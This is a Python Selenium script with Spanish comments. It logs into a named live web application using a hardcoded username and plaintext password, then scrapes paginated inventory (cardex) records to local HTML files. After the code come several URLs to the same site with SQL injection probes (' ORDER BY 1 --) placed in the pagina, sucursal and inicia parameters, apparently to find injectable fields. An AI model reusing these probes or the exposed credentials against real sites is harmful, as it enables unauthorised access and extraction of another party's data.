from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os

# --- Configuración del navegador ---
chrome_options = Options()
chrome_options.add_argument("--headless")       # Ejecutar sin interfaz gráfica
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")

# Iniciar el servicio de ChromeDriver (usa la ruta por defecto si está en el PATH)
service = Service()
driver = webdriver.Chrome(service=service, options=chrome_options)

# Crear objeto de espera
wait = WebDriverWait(driver, 10)

# --- URLS ---
login_url = "https://casart.info/INDEX2.PHP"
consulta_url = "https://casart.info/CARDEXPRODUCTO.PHP?swa=2bd3cf984652b02e220433a3b701dccf"
# URL para extraer los resultados (en este caso ANIO1=2007, tal como en el enlace de la página 2)
resultado_base_url = (
    "https://casart.info/CARDEXPRODUCTO2.PHP?"
    "swa=2bd3cf984652b02e220433a3b701dccf&pagina={}"
    "&orden=&sucursal=&CVEPROD=&CVEART="
    "&DIA1=13&MES1=02&ANIO1=2007"
    "&DIA2=13&MES2=02&ANIO2=2025&inicia=2"
)

print("🚀 Iniciando el proceso...")

# --- Paso 1: Iniciar sesión ---
print("🔗 Accediendo a la página de login:", login_url)
driver.get(login_url)
time.sleep(3)  # Espera a que cargue la página

if "login" in driver.page_source.lower() or "usuario" in driver.page_source.lower():
    print("✅ Página de login cargada correctamente.")
else:
    print("⚠️ Advertencia: No se detectó la página de login correctamente.")

print("⌨️ Ingresando credenciales...")
# Esperar a que se encuentren los campos de login
wait.until(EC.presence_of_element_located((By.NAME, "txtuser")))
driver.find_element(By.NAME, "txtuser").send_keys("DIRECTOR")
driver.find_element(By.NAME, "txtpass").send_keys("C@M#&$IA")
driver.find_element(By.XPATH, "//input[@value='Continuar']").click()
time.sleep(3)

if "bienvenido" in driver.page_source.lower() or driver.current_url != login_url:
    print("✅ Inicio de sesión exitoso.")
else:
    print("❌ Error en el inicio de sesión.")
    driver.quit()
    exit()

# --- Paso 2: Acceder a la página de consulta ---
print("🔗 Accediendo a la página de consulta:", consulta_url)
driver.get(consulta_url)

# Esperar a que se cargue el formulario de consulta (por ejemplo, el campo DIA1)
try:
    wait.until(EC.presence_of_element_located((By.NAME, "DIA1")))
    print("✅ Formulario de consulta cargado correctamente.")
except:
    print("⚠️ No se encontró el formulario de consulta.")
    driver.quit()
    exit()

print("⌨️ Rellenando el formulario de consulta...")

# Localizar y establecer valores en el formulario
dia1_elem = driver.find_element(By.NAME, "DIA1")
mes1_elem = driver.find_element(By.NAME, "MES1")
anio1_elem = driver.find_element(By.NAME, "ANIO1")
dia2_elem = driver.find_element(By.NAME, "DIA2")
mes2_elem = driver.find_element(By.NAME, "MES2")
anio2_elem = driver.find_element(By.NAME, "ANIO2")

# Establecer el período deseado: desde 13/02/2007 hasta 13/02/2025
dia1_elem.clear(); dia1_elem.send_keys("13")
mes1_elem.clear(); mes1_elem.send_keys("02")
anio1_elem.clear(); anio1_elem.send_keys("2007")  # Cambiado a 2007

dia2_elem.clear(); dia2_elem.send_keys("13")
mes2_elem.clear(); mes2_elem.send_keys("02")
anio2_elem.clear(); anio2_elem.send_keys("2025")

# Seleccionar el filtro "Todos" (radio con valor "0")
print("⌨️ Seleccionando filtro 'Todos'...")
tipo_p_elem = driver.find_element(By.XPATH, "//input[@name='tipo_p' and @value='0']")
tipo_p_elem.click()

# (La selección de sucursal se deja en el valor por defecto)

# Hacer clic en el botón "Buscar"
print("🔍 Haciendo clic en el botón 'Buscar'...")
buscar_elem = driver.find_element(By.XPATH, "//input[@value='Buscar']")
buscar_elem.click()
time.sleep(5)  # Esperar a que se carguen los resultados

# Mostrar un fragmento del HTML de la página de resultados para verificar
print("🖥️ Página de resultados de consulta (fragmento):")
print(driver.page_source[:500])  # Mostrar los primeros 500 caracteres

# --- Paso 3: Iterar sobre las páginas de resultados ---
output_folder = "cardex_respaldo"
os.makedirs(output_folder, exist_ok=True)

total_paginas = 10  # Ajusta este número según sea necesario
for pagina in range(1, total_paginas + 1):
    url_result = resultado_base_url.format(pagina)
    print(f"\n📥 Accediendo a la página de resultados {pagina}:")
    print(url_result)
    driver.get(url_result)
    time.sleep(5)  # Esperar a que se cargue la página (incluyendo ejecución de JavaScript)
    
    html = driver.page_source
    # Imprimir un fragmento para ver el contenido cargado
    print(f"📝 Código HTML (fragmento) de la página {pagina}:")
    print(html[:300])
    
    file_path = os.path.join(output_folder, f"cardex_completo_{pagina}.html")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(html)
    print(f"📂 Página {pagina} guardada en: {file_path}")

print("\n🚀 Proceso finalizado correctamente.")
driver.quit()



https://casart.info/CARDEXPRODUCTO2.PHP?swa=2bd3cf984652b02e220433a3b701dccf&pagina=3&orden=&sucursal=001&DIA1=&MES1=&ANIO1=&DIA2=&MES2=&ANIO2=&inicia=2' ORDER BY 1 -- &CVEPROD=&CVEART=
https://casart.info/CARDEXPRODUCTO2.PHP?swa=2bd3cf984652b02e220433a3b701dccf&pagina=3&orden=&sucursal=001' ORDER BY 1 -- &CVEPROD=&CVEART=&DIA1=&MES1=&ANIO1=&DIA2=&MES2=&ANIO2=&inicia=2


https://casart.info/CARDEXPRODUCTO2.PHP?swa=2bd3cf984652b02e220433a3b701dccf&pagina=1' ORDER BY 1 --&orden=&sucursal=&CVEPROD=&CVEART=
https://casart.info/CARDEXPRODUCTO2.PHP?swa=2bd3cf984652b02e220433a3b701dccf&pagina=1&orden=&sucursal=001&DIA1=&MES1=&ANIO1=&DIA2=&MES2=&ANIO2=&inicia=2%27%20ORDER%20BY%201%20--%20&CVEPROD=&CVEART=